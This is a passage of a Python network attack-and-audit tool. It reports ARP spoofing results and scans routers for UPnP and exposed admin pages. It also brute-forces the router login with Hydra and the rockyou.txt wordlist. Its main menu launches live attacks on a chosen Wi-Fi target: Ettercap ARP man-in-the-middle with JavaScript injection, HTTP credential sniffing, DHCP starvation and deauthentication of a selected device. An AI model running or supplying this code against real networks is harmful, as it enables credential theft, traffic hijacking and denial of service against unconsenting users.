    log_lines.append("The Address Resolution Protocol (ARP) is stateless and inherently vulnerable to spoofing.")
    log_lines.append("This tool broadcasted forged ARP replies to multiple connected devices.")
    log_lines.append("Any endpoint that failed to validate MAC-IP mappings and accepted spoofed responses")
    log_lines.append("was flagged as vulnerable to Layer 2 impersonation.\n")

    log_lines.append("🧨 ROOT CAUSE ANALYSIS")
    log_lines.append("──────────────────────")
    log_lines.append("• ❌ Lack of Dynamic ARP Inspection (DAI) on network switches/routers")
    log_lines.append("• ❌ No endpoint-level ARP spoof detection agents deployed")
    log_lines.append("• ❌ Devices blindly trust unsolicited ARP responses")
    log_lines.append("• ❌ No static MAC-IP binding policies enforced\n")

   
    if vulnerable_devices:
        log_lines.append("\n🛑 COMPROMISED ENDPOINTS DETECTED")
        log_lines.append("──────────────────────────────────")
        log_lines.append("The following devices accepted forged ARP replies and are at high risk:\n")
        log_lines.append(tabulate(vulnerable_devices, headers="keys", tablefmt="fancy_grid"))
        log_lines.append(f"\n⚠️ Total Affected Devices: {len(vulnerable_devices)}")
    else:
        log_lines.append("\n✅ No endpoints were compromised. Either protection mechanisms are in place,")
        log_lines.append("or spoof attempts were blocked due to host-based or network-level filters.\n")
    log_lines.append("🧠 FINAL VERDICT")
    log_lines.append("────────────────")
    if vulnerable_devices:
        log_lines.append("🚨 This environment is HIGHLY VULNERABLE to Layer 2-based attacks.")
        log_lines.append("If an attacker gains access to the local subnet, they can hijack sessions,")
        log_lines.append("redirect traffic, impersonate services, or disrupt availability without detection.\n")
    else:
        log_lines.append("✅ No immediate vulnerabilities found, but regular audits and hardened configuration")
        log_lines.append("are still strongly recommended to maintain network integrity.\n")

    

    # Save to file
    with open("arp_flood_report.txt", "w") as f:
        f.write("\n".join(log_lines))

    # Optional: Copy to static folder for web download
    try:
        shutil.copy("arp_flood_report.txt", "static/arp_flood_report.txt")
    except:
        pass

    return "\n".join(log_lines)


def check_upnp_enabled_on_router(router_ip=None):
    """
    Scans the router using Nmap's upnp-info script.
    If router_ip is not provided, it will auto-detect the default gateway.
    Returns a formatted vulnerability string.
    """
    # Auto-detect router IP if not provided
    if not router_ip:
        router_ip = os.popen("ip route | grep default | awk '{print $3}'").read().strip()

    if not router_ip:
        print("[!] Could not detect router IP.")
        return "❌ Router IP could not be detected. UPnP check skipped."

    try:
        print(f"[🧩] Scanning {router_ip} for UPnP exposure...")
        result = subprocess.run(
            ["nmap", "-p", "1900", "--script", "upnp-info", router_ip],
            capture_output=True, text=True, timeout=20
        )
        output = result.stdout

        if any(keyword in output for keyword in ["UPnP", "Server:", "Location:"]):
            vuln_msg = (
                f"🧩 <b style='color:orange;'>UPnP Enabled</b> on <code>{router_ip}</code><br>"
                "📛 This allows external services to control internal devices.<br>"
                "⚠️ Risk: Remote configuration, internal scan exposure, device hijacking."
            )
            print(f"[❌] Vulnerability found on {router_ip}: UPnP is enabled.")
            return vuln_msg
        else:
            safe_msg = (
                f"✅ <b style='color:lightgreen;'>UPnP is not enabled</b> on <code>{router_ip}</code>.<br>"
                "📡 No vulnerability found."
            )
            print(f"[✔] UPnP not detected on {router_ip}.")
            return safe_msg

    except subprocess.TimeoutExpired:
        return "⏱️ Nmap scan timed out while checking UPnP."
    except Exception as e:
        return f"⚠️ Error during UPnP check: {str(e)}"

def check_router_admin_interface(router_ip=None):
    """
    Final version with:
    - Router IP detection
    - Nmap scan
    - HTTP login page parsing
    - Title + form + field extraction
    - Vendor detection
    - Brute-force with rockyou.txt (admin only)
    - WAN exposure simulation
    - Risk scoring
    """

    if not router_ip:
        try:
            router_ip = os.popen("ip route | grep default | awk '{print $3}'").read().strip().split()[0]
        except Exception:
            return "❌ Could not detect router IP."

    if not router_ip:
        return "❌ Router IP missing. Skipping admin scan."

    output_lines = []
    score = 0
    html = ""
    output_lines.append(f"🌐 <b>Router Admin Page Scan for:</b> <code>{router_ip}</code><br>")

    # Step 1: Nmap scan
    try:
        port_result = subprocess.run(
            ["nmap", "-p", "80,443,8080,7547,23,2323,22", router_ip],
            capture_output=True, text=True, timeout=10
        )
        open_ports = re.findall(r"(\d+)/tcp\s+open", port_result.stdout)
        if open_ports:
            output_lines.append("📡 <b>Open Ports:</b> " + ", ".join(open_ports))
            score += len(open_ports)
        else:
            output_lines.append("✅ No admin ports open.")
    except Exception as e:
        output_lines.append(f"⚠️ Nmap failed: {str(e)}")

    # Step 2: Fetch admin page
    try:
        response = requests.get(f"http://{router_ip}", timeout=5, allow_redirects=True)
        html = response.text.lower()

        # Title
        title = re.search(r"<title>(.*?)</title>", html, re.IGNORECASE)
        if title:
            output_lines.append(f"🔖 <b>Page Title:</b> {title.group(1).strip()}")
        else:
            output_lines.append("🔖 <b>Page Title:</b> Not found")

        if response.history:
            output_lines.append("🔁 Redirect: HTTP → HTTPS")
        else:
            output_lines.append("⚠️ No redirect — HTTP login may be exposed")

        # Vendor
        if any(b in html for b in ["tp-link", "d-link", "netgear", "huawei", "asus", "tenda"]):
            output_lines.append("🛠️ Vendor banner found")
            score += 1

        # Login structure detection
        login_fields = re.findall(r"<input[^>]+(name|id|placeholder)=[\"']?(username|password)[\"']?", html)
        form_actions = re.findall(r"<form[^>]+action=[\"']?([^\"'> ]+)", html)

        if login_fields:
            fields = ", ".join(set([f[1] for f in login_fields]))
            output_lines.append(f"⚠️ Login fields: <code>{fields}</code>")
            score += 1

        if form_actions:
            output_lines.append(f"🧾 Form actions: <code>{', '.join(form_actions[:2])}</code>")

    except requests.exceptions.ConnectTimeout:
        output_lines.append("⏱️ Timeout — router unresponsive.")
    except Exception as e:
        output_lines.append(f"⚠️ Error accessing page: {str(e)}")

    # Step 3: rockyou.txt brute-force simulation
    try:
        rockyou_path = "/usr/share/wordlists/rockyou.txt"
        if os.path.exists(rockyou_path):
            cmd = f"hydra -l admin -P {rockyou_path} {router_ip} http-get / -t 4 -f -q"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            if "login:" in result.stdout.lower():
                found_creds = re.findall(r"login:\s*(\S+)\s+password:\s*(\S+)", result.stdout, re.IGNORECASE)
                if found_creds:
                    for user, pwd in found_creds:
                        output_lines.append(f"🔓 <b>Credentials Found:</b> <code>{user}:{pwd}</code>")
                        score += 2
            else:
                output_lines.append("✅ No valid default credentials found (admin tested via rockyou).")
        else:
            output_lines.append("📁 rockyou.txt not found. Skipping brute-force.")
    except subprocess.TimeoutExpired:
        output_lines.append("🕒 Hydra scan timed out.")
    except Exception as e:
        output_lines.append(f"⚠️ Hydra error: {str(e)}")

    # Step 4: WAN exposure
    try:
        public_ip = requests.get("https://ifconfig.me", timeout=5).text.strip()
        wan_response = requests.get(f"http://{public_ip}", timeout=5)
        if "login" in wan_response.text.lower():
            output_lines.append("🧨 <b>WAN Exposed:</b> Router admin visible externally!")
            score += 2
        else:
            output_lines.append("✅ Admin not exposed to WAN.")
    except Exception:
        output_lines.append("🌍 WAN test skipped (timeout or firewall).")

    # Step 5: Risk scoring
    if score >= 6:
        risk = "🔴 HIGH"
    elif score >= 3:
        risk = "🟠 MEDIUM"
    else:
        risk = "🟢 LOW"

    output_lines.append(f"<br>📊 <b>Risk Score:</b> {score}/10 — <b>{risk}</b>")
    return "<br>".join(output_lines)

def main():
    networks_df = scan_wifi_networks_nmcli()
    if networks_df is None:
        print("[-] No networks found.")
        return

    detect_rogue_access_points(networks_df)

    print("\n[+] Select a target network:")
    print(tabulate(networks_df, headers="keys", tablefmt="grid", stralign="left"))

    try:
        target_index = int(input("\nEnter the index of the target Wi-Fi network: "))
        target_network = networks_df.iloc[target_index]
        target_ssid = target_network["SSID"]
        target_bssid = target_network["BSSID"]
    except (IndexError, ValueError):
        print("[-] Invalid selection. Exiting.")
        return

    print(f"\n[+] Selected Target: {target_ssid} ({target_bssid})")
    analyze_network_vulnerabilities(pd.DataFrame([target_network]))

    # ⚠️ Enable IP forwarding and NAT before MITM
    enable_forwarding()

    subnet = detect_subnet_from_gateway()
    if subnet:
        devices = scan_connected_devices(subnet)
        if devices is None or devices.empty:
            devices = scan_connected_devices_iw()
        if devices is not None and not devices.empty:
            fingerprinted_df = fingerprint_devices(devices)
            fingerprinted_df.to_csv("fingerprinted_devices.csv", index=False)
            print("[✔] Fingerprint report saved as 'fingerprinted_devices.csv'")

    print("\n[✔] Scan completed successfully.")

    # ------------------ Attack Options ------------------
    print("\n[+] Do you want to run an attack on the selected network?")
    
    print("1. MITM + JavaScript Injection (Ettercap)")
    print("2. MITM + HTTP Logging (arpspoof + driftnet/urlsnarf using wlan0)")
    
    print("3. DHCP Starvation Attack (No Monitor Mode)")
    print("4.Deauth One Connected Device (No airodump/mdk4)")


    try:
        choice = int(input("Enter your choice (1-6): "))
        
        if choice == 1:
            print("\n[⚔️] Launching Ettercap for JavaScript Injection MITM...")
            os.system(f"sudo ettercap -T -M arp:remote -i {INTERFACE} -P autoadd -q")
        elif choice == 2:
            mitm_sniffing_http_credentials()  #
        elif choice == 3:
            dhcp_starvation(interface="wlan0", count=50)
        elif choice == 4:
            print("\n[⚔️] Launching single target Deauth Attack using Scapy...")
            devices = scan_connected_devices_arp()
            if devices:
                try:
                    selected = int(input("Enter the number of the device to disconnect: ")) - 1
                    victim_mac = devices[selected][1]
                    ap_mac = get_gateway_mac()
                    if ap_mac:
                        send_deauth_packets(victim_mac, ap_mac, interface="wlan0")
                    else:
                        print("[!] AP MAC could not be determined.")
                except Exception as e:
                    print(f"[!] Error: {e}")
        else:
            print("[*] Skipping attack.")
    except ValueError:
        print("[*] Invalid choice. Skipping attack.")
   
if __name__ == "__main__":
    main()
